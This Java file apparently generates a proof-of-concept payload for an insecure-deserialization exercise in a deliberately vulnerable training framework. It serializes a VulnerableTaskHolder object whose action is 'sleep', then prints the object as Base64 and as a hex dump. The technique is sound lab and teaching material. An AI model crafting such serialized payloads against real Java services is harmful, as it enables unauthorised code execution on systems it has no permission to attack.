package org.dummy.insecure.framework;

import java.io.*;
import java.util.Base64;

class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = 2L;
    private String taskAction;
    private String taskName;
    private long taskTime;
    
    public VulnerableTaskHolder(String action, String name, long time) {
        this.taskAction = action;
        this.taskName = name;
        this.taskTime = time;
    }
}

public class GeneratePayloadFullPackage {
    public static void main(String[] args) {
        try {
            System.out.println("==============================================");
            System.out.println("Generating Payload with FULL Package Name");
            System.out.println("==============================================");
            System.out.println();
            
            // Create the vulnerable task
            VulnerableTaskHolder task = new VulnerableTaskHolder("sleep", "DelayTask", 5000);
            
            // Serialize it
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(task);
            oos.close();
            
            // Base64 encode
            byte[] serializedBytes = bos.toByteArray();
            String payload = Base64.getEncoder().encodeToString(serializedBytes);
            
            System.out.println("Class: org.dummy.insecure.framework.VulnerableTaskHolder");
            System.out.println("Action: sleep");
            System.out.println("Time: 5000ms (5 seconds)");
            System.out.println();
            System.out.println("Base64 Payload:");
            System.out.println(payload);
            System.out.println();
            
            // Show hex dump to see the full class name
            System.out.println("Hex dump (first 100 bytes):");
            for (int i = 0; i < Math.min(100, serializedBytes.length); i++) {
                System.out.printf("%02X ", serializedBytes[i]);
                if ((i + 1) % 16 == 0) System.out.println();
            }
            System.out.println();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
